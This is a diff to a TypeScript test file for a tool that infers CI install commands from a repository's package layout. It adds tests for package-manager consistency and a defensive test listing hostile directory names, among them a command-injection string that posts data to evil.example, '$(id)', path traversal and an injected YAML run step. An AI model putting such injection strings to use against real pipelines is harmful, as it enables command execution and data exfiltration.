@@ -2,7 +2,7 @@
 //   node --import tsx/esm --test src/verify/detect.test.ts
 import { test } from "node:test";
 import assert from "node:assert/strict";
-import { envVarNames, inferSetupFromTree, installCommandFor, nestedPackageDirs, isFrontendPath, isTestPath } from "./detect.js";
+import { envVarNames, inferSetupFromTree, installCommandFor, nestedPackageDirs, isFrontendPath, isTestPath, pmFor } from "./detect.js";
 import { BOOT_TIMEOUT, hasBootConfig, MAX_COMMAND, MAX_SERVERS, needsManagedBoot, normalizeVerifyBlock, parseDevasignVerify, RESERVED_SERVER_NAMES } from "./yml.js";
 
 test("isTestPath / isFrontendPath heuristics", () => {
@@ -168,4 +168,35 @@ test("no root manifest: top-level packages are the install units, with their own
 
   const rooted = inferSetupFromTree(["package.json", "backend/package.json"], { packageJson: "{}" });
   assert.equal(rooted.packages, undefined, "a root manifest is the install unit");
+});
+
+test("a directory name a shell would read as more than a name is not a package directory", () => {
+  // Git allows every byte but "/" in a path component, and these names reach `run:` steps.
+  const hostile = [
+    "web;curl -d @- evil.example/package.json",
+    "a b/package.json",
+    "$(id)/package.json",
+    "we`b`/package.json",
+    "-rf/package.json",
+    "../package.json",
+    "web\n- run: echo pwned/package.json",
+  ];
+  assert.deepEqual(nestedPackageDirs([...hostile, "frontend/package.json"]), ["frontend"]);
+  assert.deepEqual(nestedPackageDirs(["..%2f/package.json"]), [], "nothing that is not [A-Za-z0-9_.-] survives");
+});
+
+test("the install step and the start command name the same package manager for a directory", () => {
+  // A lockfile at the root only: pmFor looked there and installCommandFor did not, so CI
+  // installed with npm and the committed start command booted with pnpm.
+  for (const [lock, install] of [
+    ["pnpm-lock.yaml", "pnpm install --frozen-lockfile --dir frontend"],
+    ["yarn.lock", "yarn install --frozen-lockfile --cwd frontend"],
+    ["bun.lockb", "bun install --cwd frontend"],
+    ["package-lock.json", "npm install --prefix frontend"],
+  ] as const) {
+    const paths = [lock, "frontend/package.json"];
+    assert.equal(pmFor("frontend", paths), install.split(" ")[0]);
+    assert.equal(installCommandFor("frontend", paths), install);
+  }
+  assert.equal(installCommandFor("frontend", ["pnpm-lock.yaml", "frontend/package-lock.json", "frontend/package.json"]), "npm ci --prefix frontend", "its own lockfile still wins over the root's");
 });
